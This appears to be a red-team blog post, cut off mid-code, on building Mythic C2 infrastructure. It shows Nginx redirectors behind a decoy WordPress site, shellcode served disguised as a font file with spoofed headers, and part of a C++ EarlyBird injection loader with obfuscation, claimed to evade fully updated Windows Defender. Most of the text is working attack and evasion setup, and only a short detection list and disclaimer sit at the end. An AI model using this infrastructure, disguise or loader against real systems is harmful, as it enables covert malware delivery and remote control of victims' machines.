+<p>For high-value operations, consider chaining multiple redirectors. Traffic flows through 2-3 redirectors before reaching your actual C2 server. This adds complexity for defenders to trace back to your ultimate source.</p>
+<h3>Payload Rotation and Obfuscation</h3>
+<p>Implement automatic payload rotation so that even if one payload gets burned, your infrastructure can quickly switch to new ones. Beyond simple XOR, integrate more sophisticated runtime payload decryption, polymorphic loaders, and code caves to make static and dynamic analysis harder.</p>
+<h2>Part 8: Testing Against Updated Defenses</h2>
+<p>Before we dive into detection and mitigation, let's verify that our technique works against fully updated Windows Defender. Here's the status of the test system:</p>
+<pre class="language-powershell"><code class="language-powershell">PS C:\Users\x> Get-MpComputerStatus | Select-Object AntivirusEnabled, AMServiceEnabled, AntispywareEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, NISEnabled, OnAccessProtectionEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated, AntispywareSignatureLastUpdated
+
+AntivirusEnabled                : True
+AMServiceEnabled                : True
+AntispywareEnabled              : True
+BehaviorMonitorEnabled          : True
+IoavProtectionEnabled           : True
+NISEnabled                      : True
+OnAccessProtectionEnabled       : True
+RealTimeProtectionEnabled       : True
+AntivirusSignatureLastUpdated   : 6/18/2025 9:15:19 AM
+AntispywareSignatureLastUpdated : 6/18/2025 9:15:19 AM
+</code></pre>
+<p>This shows Windows Defender is fully operational with all protection mechanisms enabled and signatures updated the same day. The EarlyBird injection technique successfully bypasses these defenses because it operates during the legitimate process initialization phase, before most behavioral monitoring kicks in.</p>
+<p>The key insight here is that even with full real-time protection, behavioral monitoring, and current signatures, the technique remains effective. This demonstrates why understanding process injection mechanics is so important for both offensive and defensive security.</p>
+<h2>Part 9: Detection and Mitigation</h2>
+<p>Understanding how this attack works also helps with defense. Here are the key detection points:</p>
+<h3>Network Monitoring</h3>
+<ul>
+<li>Look for repeated connections to the same external domains</li>
+<li>Monitor for unusual User-Agent patterns</li>
+<li>Watch for SSL connections to recently registered domains</li>
+</ul>
+<h3>Process Monitoring</h3>
+<ul>
+<li>Monitor for processes created in suspended state</li>
+<li>Watch for APC queue operations</li>
+<li>Look for memory allocations with execute permissions</li>
+</ul>
+<h3>Behavioral Analysis</h3>
+<ul>
+<li>Unusual network activity from system processes</li>
+<li>Processes making connections they normally wouldn't</li>
+<li>Memory injection patterns</li>
+</ul>
+<p>Each detection point listed here represents an area where defensive tooling is rapidly advancing. Staying ahead requires continuous research and adaptation of attack techniques, constantly refining your methodologies to counter the latest security products and analytical approaches.</p>
+<h2>Conclusion</h2>
+<p>Building effective C2 infrastructure requires thinking like both an attacker and a defender. The setup I've shown you demonstrates how multiple techniques can be combined to create a robust, stealthy communication channel that can survive in hostile environments.</p>
+<p>The key lessons here are simple but critical for foundational understanding. You need layered communication concepts – redirectors and fallback systems ensure basic operational continuity. Everything from domains to SSL certificates to HTTP headers needs to look consistently normal. Modern process injection techniques like EarlyBird can bypass many detection systems <em>at a basic level</em>. String obfuscation, jittered timing, and realistic behavior patterns are crucial for initial avoidance.</p>
+<p>This infrastructure provides a solid foundation for understanding red team operations. However, remember that the security landscape is constantly evolving. What works today might not work tomorrow, so always be ready to adapt your techniques and infrastructure as defenses improve.</p>
+<p>Most importantly, you now understand the <strong>principles</strong> behind why each component works. This foundational knowledge empowers you to adapt, research, and implement far more advanced techniques for your own operations, continuously pushing the boundaries against evolving defensive capabilities.</p>
+<h2>References</h2>
+<ol>
+<li>
+<p><strong>Mythic C2 Framework</strong><br>
+<a href="https://github.com/its-a-feature/Mythic">Mythic: A cross-platform, post-exploit, red teaming framework</a></p>
+</li>
+<li>
+<p><strong>Apollo Agent for Mythic</strong><br>
+<a href="https://github.com/MythicAgents/apollo">Apollo - A .NET Framework 4.0 Windows Agent</a></p>
+</li>
+<li>
+<p><strong>HTTP C2 Profile for Mythic</strong><br>
+<a href="https://github.com/MythicC2Profiles/http">HTTP C2 Profile for Mythic Framework*</a></p>
+</li>
+<li>
+<p><strong>EarlyBird Injection Technique</strong><br>
+<a href="https://www.cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered/">New ‘Early Bird’ Code Injection Technique Discovered*. Cyberark Security Research, 2018.</a></p>
+</li>
+<li>
+<p><strong>Windows APC Internals</strong><br>
+<a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Asynchronous Procedure Calls*. Windows Development Documentation.</a></p>
+</li>
+<li>
+<p><strong>C2 Infrastructure Design Patterns</strong><br>
+<a href="https://attack.mitre.org/tactics/TA0011/">MITRE ATT&#x26;CK Framework. Command and Control Tactics. MITRE Corporation.</a></p>
+</li>
+<li>
+<p><strong>WinHTTP Programming Interface</strong><br>
+<a href="https://docs.microsoft.com/en-us/windows/win32/winhttp/winhttp-start-page">WinHTTP API Reference. Windows Development Documentation.</a></p>
+</li>
+</ol>
+<hr>
+<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
+</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"slug":"mythic-c2-early-bird-defender-evasion","contentHtml":"\n\u003cp\u003e\u003cimg src=\"/images/mythic-c2-infrastructure.jpeg\" alt=\"Mythic C2 infrastructure with redirectors\"\u003e\u003c/p\u003e\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eLet's talk about building C2 infrastructure that actually works in the real world. Most red teamers think they can just spin up a Cobalt Strike server and call it a day, but that's how you get burned within hours. Modern blue teams know what to look for, and if your infrastructure screams \"malicious C2 server,\" you're done before you even start. This article dives deep into building C2 infrastructure with a focus on foundational stealth and resilience, pushing past the basic setups that often get torched by modern blue teams. While initial deployments can be quickly spotted, the techniques we're covering here are a significant leap toward more robust operations.\u003c/p\u003e\n\u003cp\u003eI've been running red team operations for years, and what I've learned is that your infrastructure makes or breaks your entire engagement. You can have the best exploits in the world, but if your command and control gets detected and blocked, you're toast. That's why I always invest serious time in building infrastructure that can survive detection.\u003c/p\u003e\n\u003cp\u003eIn this article, I'll walk you through setting up a complete Mythic C2 framework with robust HTTP/HTTPS redirectors, designed to obscure your true C2 infrastructure from direct internet exposure. While this setup employs principles similar to domain fronting by routing traffic through an intermediary, it focuses on a direct Nginx proxy configuration rather than leveraging a large CDN's infrastructure. Next up, we'll get into EarlyBird injection – a clever technique that's pretty effective for getting your payloads up and running by playing off how Windows creates processes, which can slip past certain modern EDR detections that are looking for more traditional injection methods.\u003c/p\u003e\n\u003ch2\u003eImportant Disclaimer: Foundational Principles\u003c/h2\u003e\n\u003cp\u003eIt's crucial to understand that this article provides a \u003cstrong\u003efoundational overview\u003c/strong\u003e of building C2 infrastructure and implementing EarlyBird injection. While these techniques are effective for demonstrating core principles of red team operations and evasion, real-world advanced persistent threats (APTs) and sophisticated red team engagements often employ significantly more advanced, layered, and ephemeral tradecraft to maintain stealth against modern defensive solutions.\u003c/p\u003e\n\u003cp\u003eConsider the setup described here as a strong starting point for understanding the concepts. True operational security (OPSEC) in highly contested environments requires continuous research, adaptation, and integration of cutting-edge techniques that go beyond these fundamentals.\u003c/p\u003e\n\u003cp\u003eThe redirector configuration shown in this article is intentionally simple and tailored for instructional purposes. If you're interested in building more resilient and stealthy redirector chains with advanced traffic shaping, TLS termination, or CDN integration, check out my dedicated write-up here: 11. \u003ca href=\"https://xbz0n.sh/blog/c2-redirectors\"\u003eC2 Redirectors: Advanced Infrastructure for Modern Red Team Operations\u003c/a\u003e\u003c/p\u003e\n\u003ch2\u003eWhy This Setup Works\u003c/h2\u003e\n\u003cp\u003eBefore we dig into the tech, let's lay out why this particular infrastructure design is such a solid launching pad for understanding C2 operational security. The big takeaway is that modern defense ain't just about catching malware anymore – it's about dissecting communication patterns, figuring out infrastructure relationships, and spotting weird behavior.\u003c/p\u003e\n\u003cp\u003eOur redirector serves legitimate content while secretly forwarding C2 traffic to the backend server. Blue teams see normal WordPress traffic, not suspicious C2 communications. All traffic is encrypted with legitimate certificates, making it nearly impossible to inspect the actual payload traffic without breaking SSL.\u003c/p\u003e\n\u003cp\u003eInstead of dropping files to disk, our loader injects directly into memory using the EarlyBird technique, bypassing most file-based detection. We use real domain names, real SSL certificates, and real web content. Everything looks completely normal from the outside.\u003c/p\u003e\n\u003cp\u003eThe beauty of this approach is that each component has plausible deniability. A business website? Completely normal. API endpoints for booking systems? Makes perfect sense. Font files being downloaded? Happens on every website. It's only when you put all the pieces together that you see the real purpose.\u003c/p\u003e\n\u003ch2\u003ePart 1: Setting Up Mythic C2 Framework\u003c/h2\u003e\n\u003cp\u003eMythic is hands down one of the best C2 frameworks available today. It's actively maintained, has excellent OPSEC features, and supports multiple agents and protocols. What I love about Mythic is that it's built from the ground up with real operations in mind.\u003c/p\u003e\n\u003cp\u003eLet's get it running on our backend server.\u003c/p\u003e\n\u003ch3\u003eInitial Mythic Installation\u003c/h3\u003e\n\u003cp\u003eI'm setting this up on an Ubuntu server with internal IP 10.0.0.2. This server will never be directly exposed to the internet - all traffic will come through our redirectors. That's a critical point for OPSEC - your actual C2 server should be completely hidden behind your redirector infrastructure.\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003egit clone https://github.com/its-a-feature/Mythic.git\ncd Mythic/\nsudo ./install_docker_ubuntu.sh\n# After reboot, ensure Docker is running and Mythic containers are built\n# If starting fresh after reboot, navigate back to Mythic directory\n# cd Mythic/\n# sudo ./install_docker_ubuntu.sh # Run again only if Docker services didn't start correctly\n# You might also need to run `sudo systemctl start docker` if it didn't start automatically.\nsudo apt-get install make\nmake\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe installation script handles all the Docker setup and dependencies. After the reboot, we run it again to make sure everything's properly configured. The \u003ccode\u003emake\u003c/code\u003e command builds all the containers and gets everything ready.\u003c/p\u003e\n\u003ch3\u003eInstalling Apollo Agent\u003c/h3\u003e\n\u003cp\u003eApollo is Mythic's premier Windows agent. It's written in C# and has excellent capabilities for process injection, credential harvesting, and lateral movement.\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e./mythic-cli install github https://github.com/MythicAgents/apollo\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eApollo gives us everything we need for Windows environments - it can inject into processes, execute .NET assemblies in memory, and has built-in OPSEC features like sleep obfuscation and jitter.\u003c/p\u003e\n\u003ch3\u003eInstalling HTTP C2 Profile\u003c/h3\u003e\n\u003cp\u003eThe HTTP profile handles our web-based C2 communications. It's perfect for our redirector setup because it generates normal-looking HTTP traffic.\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003e./mythic-cli install github https://github.com/MythicC2Profiles/http\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis profile supports multiple communication methods, including GET and POST requests that blend in perfectly with normal web traffic.\u003c/p\u003e\n\u003ch3\u003eStarting Mythic\u003c/h3\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003esudo ./mythic-cli start\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOnce everything's running, we can get our admin credentials:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ecat .env\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis shows us the randomly generated admin password for the Mythic web interface. The server will be accessible on the internal network at \u003ccode\u003ehttps://10.0.0.2:7443\u003c/code\u003e.\u003c/p\u003e\n\u003ch2\u003ePart 2: Building the Redirector Infrastructure\u003c/h2\u003e\n\u003cp\u003eNow comes the fun part - setting up our redirector infrastructure. This is where we create the illusion of legitimate web services while secretly tunneling C2 traffic to our Mythic server.\u003c/p\u003e\n\u003ch3\u003eDomain and Certificate Setup\u003c/h3\u003e\n\u003cp\u003eFirst, you need to register a legitimate-looking domain. The key is picking something that sounds real and matches your target environment. A business or technology site works well because it explains why people might be visiting the domain.\u003c/p\u003e\n\u003cp\u003eWe need SSL certificates for all our subdomains:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003esudo certbot --nginx -d www.example-business.com -d api.example-business.com -d dl.example-business.com\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis gives us legitimate SSL certificates from Let's Encrypt for:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ewww.example-business.com\u003c/code\u003e - Our decoy WordPress site\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eapi.example-business.com\u003c/code\u003e - C2 communications endpoint\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003edl.example-business.com\u003c/code\u003e - Payload hosting endpoint\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3\u003eCreating the WordPress Decoy\u003c/h3\u003e\n\u003cp\u003eA convincing decoy site is crucial for OPSEC. If someone investigates our domain, they need to find something believable. In this example, we use WordPress purely for demonstration purposes because it’s widely deployed and provides dynamic, realistic-looking content out of the box. However, in real operations, WordPress should generally be avoided—its large attack surface and frequent vulnerabilities make it a liability. If the decoy site gets compromised, it could jeopardize your entire infrastructure. A better approach in production is to use a static site (e.g., generated with Hugo, Jekyll, or plain HTML), which has a minimal attack surface and is far easier to lock down.\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003esudo apt update\nsudo apt install -y ca-certificates curl gnupg lsb-release ufw\nsudo install -m0755 -d /etc/apt/keyrings\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg \\\n  | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\necho \\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \\\n  https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" \\\n  | sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null\nsudo apt update\nsudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin\nsudo systemctl enable --now docker\nsudo usermod -aG docker $USER\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSetting up the WordPress container:\u003c/p\u003e\n\u003cpre class=\"language-bash\"\u003e\u003ccode class=\"language-bash\"\u003ePROJECT_DIR=\"/opt/business-decoy\"\nDOMAIN=\"example-business.com\"\n\nmkdir -p \"$PROJECT_DIR\"\ncat \u003e \"$PROJECT_DIR/docker-compose.yml\" \u0026#x3C;\u0026#x3C;EOF\nservices:\n  wordpress:\n    image: wordpress:latest\n    ports:\n      - \"127.0.0.1:8000:80\"\n    environment:\n      WORDPRESS_DB_HOST: db\n      WORDPRESS_DB_USER: wordpress\n      WORDPRESS_DB_PASSWORD: wordpress\n      WORDPRESS_DB_NAME: wordpress\n      WORDPRESS_CONFIG_EXTRA: |\n        define('WP_HOME', 'https://$DOMAIN');\n        define('WP_SITEURL', 'https://$DOMAIN');\n    volumes:\n      - wordpress_data:/var/www/html\n    depends_on:\n      - db\n\n  db:\n    image: mysql:5.7\n    restart: always\n    environment:\n      MYSQL_DATABASE: wordpress\n      MYSQL_USER: wordpress\n      MYSQL_PASSWORD: wordpress\n      MYSQL_ROOT_PASSWORD: root\n    volumes:\n      - db_data:/var/lib/mysql\n\nvolumes:\n  wordpress_data:\n  db_data:\nEOF\n\ncd \"$PROJECT_DIR\"\ndocker compose down -v\ndocker compose up -d\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a fully functional WordPress site running on localhost port 8000. The WordPress configuration forces HTTPS URLs, which is important for maintaining our SSL facade.\u003c/p\u003e\n\u003ch3\u003eThe Nginx Redirector Configuration\u003c/h3\u003e\n\u003cp\u003eHere's where the magic happens. Our Nginx configuration serves three different purposes depending on which subdomain is accessed:\u003c/p\u003e\n\u003cpre class=\"language-nginx\"\u003e\u003ccode class=\"language-nginx\"\u003e# /etc/nginx/sites-available/example-business\n\n# Legitimate decoy site\nserver {\n    listen 443 ssl;\n    server_name www.example-business.com;\n    client_max_body_size 64M;\n    ssl_certificate /etc/letsencrypt/live/www.example-business.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/www.example-business.com/privkey.pem;\n    include /etc/letsencrypt/options-ssl-nginx.conf;\n    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n\n    location / {\n        proxy_pass http://127.0.0.1:8000; # WordPress container running locally\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto https;\n    }\n}\n\n# Mythic C2 reverse proxy\nserver {\n    listen 443 ssl;\n    server_name api.example-business.com;\n\n    ssl_certificate /etc/letsencrypt/live/www.example-business.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/www.example-business.com/privkey.pem;\n    include /etc/letsencrypt/options-ssl-nginx.conf;\n    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n\n    location / {\n        proxy_pass http://10.0.0.2:80;\n        proxy_ssl_verify off;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    }\n}\n\n# Optional file hosting (e.g., for staging payloads)\nserver {\n    listen 443 ssl;\n    server_name dl.example-business.com;\n\n    ssl_certificate /etc/letsencrypt/live/www.example-business.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/www.example-business.com/privkey.pem;\n    include /etc/letsencrypt/options-ssl-nginx.conf;\n    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n\n    location /assets/fonts/manrope-light.ttf {\n        proxy_pass https://10.0.0.2:7443/direct/download/01fd417f-95e3-42dd-a26c-98d5262ac37d;\n        proxy_ssl_verify off;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        # Optional headers to simulate legit service\n        proxy_hide_header Content-Disposition;\n        add_header Content-Type \"application/font-ttf\";\n        add_header X-Powered-By \"PHP/8.1.9\";\n        add_header Server \"cloudflare\";\n    }\n}\n\n# Redirect all HTTP traffic to HTTPS\nserver {\n    listen 80;\n    server_name www.example-business.com;\n    return 301 https://$host$request_uri;\n}\n\nserver {\n    listen 80;\n    server_name api.example-business.com dl.example-business.com;\n    return 301 https://$host$request_uri;\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe configuration creates three distinct services that work together. The main decoy site at www.example-business.com proxies all traffic to our WordPress container, so anyone visiting the main domain sees a legitimate business website. This is your front-facing presence that provides cover for the real infrastructure.\u003c/p\u003e\n\u003cp\u003eThe C2 communications happen through api.example-business.com, which is where the real magic occurs. All traffic to this subdomain gets forwarded directly to our Mythic server on the internal network. Our implants will connect here, but to external observers it just looks like API calls to a business service.\u003c/p\u003e\n\u003cp\u003eFor payload hosting, dl.example-business.com handles the actual malware downloads. The specific path \u003ccode\u003e/assets/fonts/manrope-light.ttf\u003c/code\u003e looks like a legitimate web font file, but it's actually serving our shellcode from Mythic's file hosting service. The font file disguise is particularly effective because font downloads are extremely common and rarely scrutinized.\u003c/p\u003e\n\u003cp\u003eEverything gets redirected to HTTPS automatically, which maintains our legitimate appearance while also encrypting all the actual C2 traffic flowing through the infrastructure.\u003c/p\u003e\n\u003cp\u003eThe beauty of this setup is that each subdomain serves a different purpose, but they all use the same SSL certificate and appear to be part of the same legitimate website infrastructure.\u003c/p\u003e\n\u003cp\u003eFor detailed implementation guides and advanced redirector architectures, see my in-depth article on \u003ca href=\"https://xbz0n.sh/blog/c2-redirectors\"\u003eC2 Redirector Techniques\u003c/a\u003e.\u003c/p\u003e\n\u003ch3\u003eWhy This Redirector Design Works\u003c/h3\u003e\n\u003cp\u003eThe key insight here is that we're not just hiding our C2 traffic - we're making it look completely legitimate. Here's why this approach is so effective:\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLegitimate SSL Certificates\u003c/strong\u003e: We're using real certificates from Let's Encrypt, not self-signed ones that security tools flag.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRealistic URL Patterns\u003c/strong\u003e: The font file path looks exactly like something you'd see on any modern website.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eProper HTTP Headers\u003c/strong\u003e: We're adding headers that make our responses look like they're coming from a real CDN or web server.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMultiple Service Simulation\u003c/strong\u003e: By having different subdomains for different purposes, we simulate how real companies structure their web infrastructure.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eNo Direct C2 Exposure\u003c/strong\u003e: Our actual Mythic server is designed to be completely hidden from the internet. All external C2 and payload traffic gets shunted exclusively through the redirector, which then proxies those connections back to our internal Mythic server.\u003c/p\u003e\n\u003ch2\u003ePart 3: Generating and Hosting the Payload\u003c/h2\u003e\n\u003cp\u003eWith our infrastructure ready, we need to generate a payload and make it available through our redirector. Mythic makes this straightforward.\u003c/p\u003e\n\u003ch3\u003eCreating the Apollo Payload\u003c/h3\u003e\n\u003cp\u003eIn the Mythic web interface, we create a new payload with these settings:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAgent\u003c/strong\u003e: Apollo\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eC2 Profile\u003c/strong\u003e: HTTP\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCallback Host\u003c/strong\u003e: \u003ccode\u003eapi.example-business.com\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCallback Port\u003c/strong\u003e: 443\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eOutput Format\u003c/strong\u003e: Shellcode\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe generated shellcode gets a unique identifier like \u003ccode\u003e01fd417f-95e3-42dd-a26c-98d5262ac37d\u003c/code\u003e and becomes available at:\n\u003ccode\u003ehttps://10.0.0.2:7443/direct/download/01fd417f-95e3-42dd-a26c-98d5262ac37d\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003eThe Redirector Magic\u003c/h3\u003e\n\u003cp\u003eHere's where our redirector configuration pays off. Thanks to our Nginx setup, this payload is now accessible at:\n\u003ccode\u003ehttps://dl.example-business.com/assets/fonts/manrope-light.ttf\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eTo anyone monitoring network traffic, this looks like a normal request for a web font file. The Content-Type header says it's a font, the URL looks legitimate, and it's served over HTTPS from what appears to be a business website.\u003c/p\u003e\n\u003cp\u003eBut in reality, it's serving our Apollo shellcode that will establish a connection back to our C2 infrastructure.\u003c/p\u003e\n\u003ch2\u003ePart 4: The EarlyBird Injection Loader\u003c/h2\u003e\n\u003cp\u003eNow we need a way to execute our payload on target systems. This is where our custom loader comes in. The loader implements the EarlyBird injection technique, which is particularly effective because it injects code before the target process fully initializes.\u003c/p\u003e\n\u003ch3\u003eUnderstanding EarlyBird Injection\u003c/h3\u003e\n\u003cp\u003eEarlyBird injection is a process injection technique that takes advantage of the Windows process creation workflow. Here's how it works:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eCreate Suspended Process\u003c/strong\u003e: We create a new process in a suspended state using the \u003ccode\u003eCREATE_SUSPENDED\u003c/code\u003e flag.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAllocate Memory\u003c/strong\u003e: While the process is suspended, we allocate memory in its address space.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWrite Payload\u003c/strong\u003e: We write our shellcode to the allocated memory.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eQueue APC\u003c/strong\u003e: We use \u003ccode\u003eQueueUserAPC\u003c/code\u003e to queue an Asynchronous Procedure Call that points to our shellcode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eResume Process\u003c/strong\u003e: When we resume the process, the APC executes our code before the main thread starts.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe beauty of this technique is timing. Most EDR solutions monitor process creation and memory allocation, but EarlyBird happens during the natural process initialization phase, making it much harder to detect.\u003c/p\u003e\n\u003ch3\u003eThe Complete Loader Implementation\u003c/h3\u003e\n\u003cp\u003eLet me walk through the actual loader code and explain exactly how it works. This is a well-crafted C++ application that implements EarlyBird injection with multiple evasion techniques:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e#include \u0026#x3C;Windows.h\u003e\n#include \u0026#x3C;winternl.h\u003e\n#include \u0026#x3C;winhttp.h\u003e\n#include \u0026#x3C;iostream\u003e\n#include \u0026#x3C;vector\u003e\n#include \u0026#x3C;random\u003e\n#include \u0026#x3C;thread\u003e\n#include \u0026#x3C;chrono\u003e\n#include \u0026#x3C;string\u003e\n#include \u0026#x3C;array\u003e\n#include \u0026#x3C;intrin.h\u003e\n#include \u0026#x3C;sstream\u003e\n#include \u0026#x3C;iomanip\u003e\n#include \u0026#x3C;TlHelp32.h\u003e\n#include \u0026#x3C;ktmw32.h\u003e\n#include \u0026#x3C;map\u003e\n\n#pragma comment(lib, \"winhttp.lib\")\n#pragma comment(lib, \"ntdll.lib\")\n#pragma comment(lib, \"ktmw32.lib\")\n#pragma comment(lib, \"advapi32.lib\")\n#pragma comment(lib, \"user32.lib\")\n\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) \u003e= 0)\n#define LOG(msg) std::cout \u0026#x3C;\u0026#x3C; \"[+] \" \u0026#x3C;\u0026#x3C; msg \u0026#x3C;\u0026#x3C; std::endl\n#define LOG_ERROR(msg) std::cerr \u0026#x3C;\u0026#x3C; \"[-] \" \u0026#x3C;\u0026#x3C; msg \u0026#x3C;\u0026#x3C; std::endl\n#define LOG_WARNING(msg) std::cout \u0026#x3C;\u0026#x3C; \"[!] \" \u0026#x3C;\u0026#x3C; msg \u0026#x3C;\u0026#x3C; std::endl\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe includes and pragmas set up everything we need. Windows.h gives us the core Windows API functions for process manipulation, while winternl.h provides access to internal Windows structures and undocumented APIs that aren't in the standard headers.\u003c/p\u003e\n\u003cp\u003eWe need winhttp.h for HTTP client functionality to download our payloads, and TlHelp32.h for process enumeration and manipulation. The ktmw32.h header is for Kernel Transaction Manager operations, though we don't use those features in this particular loader.\u003c/p\u003e\n\u003cp\u003eThe pragma comments link against the necessary libraries at compile time, which is crucial because we're using APIs from multiple Windows subsystems. Without these, the linker wouldn't know where to find the functions we're calling.\u003c/p\u003e\n\u003ch3\u003eUnderstanding the Loader Architecture\u003c/h3\u003e\n\u003cp\u003eBefore diving into the code, let's understand what makes this loader special. Most basic process injectors follow a simple pattern: allocate memory, write shellcode, create thread. Our loader is different because it implements multiple layers of protection and evasion that work together.\u003c/p\u003e\n\u003cp\u003eInstead of embedding payloads directly in the binary, we download them at runtime with multiple fallback mechanisms. This keeps the initial loader small and makes it harder for static analysis tools to detect malicious code. The loader uses random delays and realistic HTTP patterns to make network traffic look legitimate rather than automated.\u003c/p\u003e\n\u003cp\u003eFor anti-analysis protection, we use string obfuscation and runtime decryption to prevent static analysis tools from easily identifying what the loader is trying to do. The process selection logic picks targets based on what's actually running on the system rather than hardcoding a specific process name.\u003c/p\u003e\n\u003cp\u003eMost importantly, the EarlyBird injection technique executes our code during process initialization rather than after the process is already running. This timing makes it much harder for EDR systems to detect because our code runs before most monitoring hooks are in place.\u003c/p\u003e\n\u003ch3\u003eXOR Encryption for Embedded Payload\u003c/h3\u003e\n\u003cp\u003eThe loader includes a simple XOR encryption function for the embedded fallback payload:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e    // XOR encryption/decryption\n    void XorCrypt(std::vector\u0026#x3C;BYTE\u003e\u0026#x26; data, const std::vector\u0026#x3C;BYTE\u003e\u0026#x26; key) {\n        for (size_t i = 0; i \u0026#x3C; data.size(); i++) {\n            data[i] ^= key[i % key.size()];\n        }\n    }\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis XOR encryption is primarily for the embedded fallback payload, ensuring it's not plaintext in the binary if network downloads fail. The primary downloaded payload from Mythic, transmitted over HTTPS, does not undergo additional XOR decryption by the loader.\u003c/p\u003e\n\u003cp\u003eThis implements a repeating-key XOR cipher. While XOR isn't cryptographically secure, it's perfect for this use case. XOR operations are extremely fast, adding minimal overhead to the loader. There's no complex key schedules or initialization vectors to worry about, and the same operation encrypts and decrypts. Most importantly, many EDR systems don't flag XOR operations as suspicious since they're used in legitimate software all the time.\u003c/p\u003e\n\u003cp\u003eThe key repeats across the data length using modulo arithmetic. This provides basic obfuscation for the embedded payload without adding complexity to the loader.\u003c/p\u003e\n\u003ch3\u003eString Obfuscation\u003c/h3\u003e\n\u003cp\u003eNow the loader implements a clever compile-time string obfuscation system to hide sensitive strings from static analysis:\u003c/p\u003e\n\u003cpre class=\"language-cpp\"\u003e\u003ccode class=\"language-cpp\"\u003e// String obfuscation\n#define XOR_KEY 0x42\ntemplate\u0026#x3C;int N\u003e\nstruct ObfuscatedString {\n    char data[N];\n    constexpr ObfuscatedString(const char(\u0026#x26;str)[N]) {\n        for (int i = 0; i \u0026#x3C; N; i++) {\n            data[i] = str[i] ^ XOR_KEY;\n        }\n    }\n    \n    std::string decrypt() const {\n        std::string result;\n        for (int i = 0; i \u0026#x3C; N - 1; i++) {\n            result += (data[i] ^ XOR_KEY);\n        }\n        return result;\n    }\n};\n\n#define 